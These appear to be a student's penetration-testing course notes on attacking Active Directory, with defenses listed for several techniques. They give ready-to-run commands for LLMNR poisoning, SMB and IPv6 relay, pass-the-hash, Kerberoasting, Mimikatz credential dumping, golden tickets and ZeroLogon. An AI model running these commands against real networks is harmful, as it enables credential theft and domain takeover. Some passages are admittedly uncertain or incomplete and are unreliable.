
=======================================================================================
=======================================================================================
=======================================================================================

                             Active Directory Attacks

=======================================================================================
=======================================================================================
=======================================================================================
  These things are best done at busy times where people are sending lots of requests.
=======================================================================================

    Attacking AD:
        1. Run mitm6 or responder at the beginning of the day.
        2. Run scans.
        3. Run scans on http with http_version (metasploit) to be quiet.
        4. Look for default credentials.
        5. Think outside the box.


    LLMNR Poisoning- Link Local Multicast Name Resolution
    
    When a DNS on a server fails on a domain controller/server, the server may let out a broadcast to try and resolve the DNS that is requested. While the broadcast
    happens, we can listen using something like Responder and catch the request and instead obtain the hashes of the username and password, which is always
    sent in an LLMNR broadcast.

    We can try to capture credentials sent in LLMNR/NBT-NS/DNS packets by using responder:
        "responder -I eth0 -rdwv"

=======================================================================================

    SMB Relay Attack
    
    *** IMPORTANT ***
    *** SMB SIGNING MUST BE DISABLED ***
    *** USER BEING RELAYED MUST BE AN ADMIN ***
    
    When we receive a hashed password/username from a target and aim to use it on a SMB (by relaying to it) we can impersonate them. We can do this by 
    using ntlxrelayx.py (in impacket). 
    
    An easy way to check if an smb fileshare port is vulnerable to an SMB relay attack is the use the nmap command:
        
        "nmap --script=smb2-security-mode.nse -p445 <target IP>/24"
    
    Bouncing the hashed credentials will involve these commands:
        
        1. Responder to catch the broadcast:
              "responder -I eth0 -rdwv"
                  * Make sure to turn off SMB server off and HTTP server off as well, for some unknown reason.
    
        2. Then, ntlxrelayx.py to relay the responder info received:
              "ntlmrelayx.py -tf targets.txt -smb2support [i]" (adding i will make it and interactive shell rather than just get hashes.)
                * The targets should be any other computer, preferrably where the credentials being sent will be admin.
    
        3. If successful, we will obtain the hashes from the SAM file on the unprotected active directory.
            * If interactive, use netcat to connect to the tcp port specified on the ntlm output.
            
    ***********************************

                Defenses

    ***********************************

    1. Disable NTLM authentication on network.

    2. Enable SMB signing on all devices.

    3. Local Administration restriction.


=======================================================================================

    IPv6 Attack

    The idea with a IPv6 attack is that no one is authenticating IPv6 addresses. Because of this, we can catch
    the IPv6 info (which will be in the NTLM form [hashes]) and then we can relay the info to the Domain Controller.

    It is the most useful when someone tries to authenticate, and we
    pass the NTLM data and use mitm6 to create our own account on the
    DC.

    Commands:
        1. "mitm6 -d xxxx.local"
            - This will allows us to spoof as a fake IPv6 address on the DC.

        2. "ntlmrelayx.py -6 -t ldaps://<DC IP> -wh fakewpad.<DC Domain> -l lootme"
            - This will relay the info to the DC and try to authenticate.
            - Along with access, it will enumerate tons of information.


    ***********************************

                Defenses

    ***********************************

    1. Disable IPv6

    2. Enable LDAPS and LDAP signing and channel binding

    3. Mark Admins as Protected Users, as this will disallow delegationg attacks.


=======================================================================================
=======================================================================================

                        Post Comprimise Enumeration

=======================================================================================
=======================================================================================

    PowerView:
        Powershell Commands (after running "powershell -ep bypass"):
        **PowerView Upload**
        - Get-NetDomain
        - Get-NetDomainController
        - Get-DomainPolicy
        - (Get-DomainPolicy)."system access"
        - Get-NetUser [| select [cn, samaccountname, etc] ]
        - Get-NetGroupMember 
        - Invoke-ShareFinder
        - Get-NetGPO 

    BloodHound:
        - First, you need to upload SharpHound.ps1 on the machine.
        - Then run:
            "Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip"
        - You then need to copy the data to another machine (I don't know which yet)


=======================================================================================
=======================================================================================

                           Post-Compromise Attacks

=======================================================================================
=======================================================================================


    Pass the Password/Hash Attack

        - Use crackmapexec to use a username and password/hash to locally
        probe and test if anything can be done with the information gained.
        ie :
            "crackmapexec smb <ip/CIDR(/24 or whatever)> -u <user> -H <hash> --local-auth"
        - Use secretsdump.py from impacket:
        ie:
            "secretsdump.py <user>:<password>@<IP address>


    ***********************************

                Defenses

    ***********************************

    1. Limit Account reuse (don't allow the same admin on multiple machines)

    2. Utilize very strong password policies

    3. Privilege Access Manangement (temporary passwords that rotate).


=======================================================================================

    Token Impersonation

    Token Types:
        -Delegate
            * Created for logging into a machine or using Remote Desktop.
        -Impersonate
            * "non-interactive" such as attaching a network drive or a domain logon script.
        - A delegate token will remain on a server until it is rebooted if a new token visits the
        server.

    The "load" feature on metasploit once we gain access can do many useful things.
        - "load incognito"
            * This can allow us to impersonate a user token.
        - list_tokens -u will allow you to see all the tokens available.
        - rev2self will return to the first token on meterpreter.

    ***********************************

                Defenses

    ***********************************

    1. Limit user/group token creation permissions.

    2. Account tiering.

    3. Local admin restriction.


=======================================================================================

    Kerberoasting

    What is Kerberos?
        Kerberos is a Domain Controller software system that provides tickets to computers that access tha domain controller.
        The tickets, called Ticket Granting Tickets, will allow communication with users and services through the Kerberos DC.
        In order for a computer to get a ticket, the computer must have an NTLM hash (which is a username and password).
        
        Using the TGT, we can be granted a TGS, a Ticket Granting Service Ticket, which will allow us to acces services in the network.
        The ticket itself will come attached with an encrypted service server hash. This is where we attack. 

        We can use:
            "python3 GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request"

            to get the TGS.

        We then use Hashcat to crack the hash generated by the GetUserSPNs on the TGS.

    ***********************************

                Defenses

    ***********************************

    1. Strong Passwords
    2. Least Privilege


=======================================================================================

    GPP Attack (older attack for ms 2012)

    SYSVOL used to store a password for the domain admin. If a smb share has
    a SYSVOL, you can see the groups.xml file where the cpassword is stored.
    
    This can allow us to get stored credentials. It can be useful if you get
    something such as a password or a TGS to kerberoast.

    Use msfconsole: auxiliary(smb_enum_gpp).

=======================================================================================

    URL File attack

    Once you have credentials that can write to a smb share, you can
    use a url file to capture more hashes and crack them.

    The key is the get someone to click on the file and then point a connection
    to you, where you will be listening with responder.

=======================================================================================

    PrintNightmare (Heath had trouble with this one)

    This exploit abuses the printer spooler in a network.

    You can:
        1. Create a reverse_tcp payload as a .dll file.
        2. Set up a listener that listens to the address specified in the .dll file.
        3. Use impacket and CVE-2021-1675.py (which is called PrintNightmare).
            "


=======================================================================================

    Mimikatz

    This tool is focused on exploiting many things in Windows security.
    Credential dumping is it's specialty.

    It must be uploaded to a Windows machine to exploit it.

    The first step you should do is this (after mimikatz.exe):
        "privilege::debug"
        (You want to see "20 OK")
        
        This bypasses proctections on certain memory sections which we will use in mimikatz.
    
    Then you can try:
        "sekurlsa::logonpasswords"
        "lsadump::lsa /patch"


    Golden Ticket Attack

    The strategy here is to try to use the hash of the ticket granting service 
    to generate your own tickets and gain access to the entire network.
    
    "privilege::debug"
    "lsadump::lsa /inject /name:krbtgt"
    
        - You will need to copy the SID and the NTLM hash of the kerberos tgt account and paste it into a file for
        keeping.
    
    "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID from earlier> /krbtgt:<the krb hash> /id:500 /ptt"

    This will use a ticket and open a command prompt as administrator i think (this one was horribly explained).


=======================================================================================
=======================================================================================

        ZeroLogon Attack

        This sets the password of a domain controller to an empty string.

        CVE-2020-1472

        Just follow the instructions on the github then use secretsdump to get access on all
        of the server hashes and whatnot.

        The machine will be destroyed, so make sure you copy the admin hash and use the restore
        program found in the github download.


=======================================================================================
=======================================================================================
                Other Resources

           Active Directory Security Website (lots of stuff to see?)

           harmj0y specterops - Makes a lot of tools and writes a blog.

           Pentester Academy

            eLearn Security Course (What the fuck another course? wtf heath)
